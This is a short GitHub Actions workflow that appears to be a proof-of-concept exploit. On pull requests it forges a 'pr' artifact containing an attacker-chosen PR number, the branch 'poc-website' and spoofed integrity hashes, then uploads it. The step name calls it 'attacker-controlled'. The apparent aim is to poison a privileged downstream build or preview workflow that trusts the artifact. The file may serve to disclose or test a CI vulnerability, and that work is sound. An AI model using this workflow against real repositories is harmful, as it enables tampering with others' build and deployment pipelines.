name: Call Build Preview
on:
  pull_request:
    types: [opened, reopened, synchronize]
permissions:
  contents: read
jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled PR info artifact
        run: |
          mkdir -p pr
          printf '1' > pr/number
          printf 'poc-website' > pr/branch
          printf '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b:562a63f0e71d2d0f986c2c5f800c93b50fdf6e3bccb221fe0c322b8154dc97e1' > pr/integrity
      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        with:
          name: pr
          path: pr/
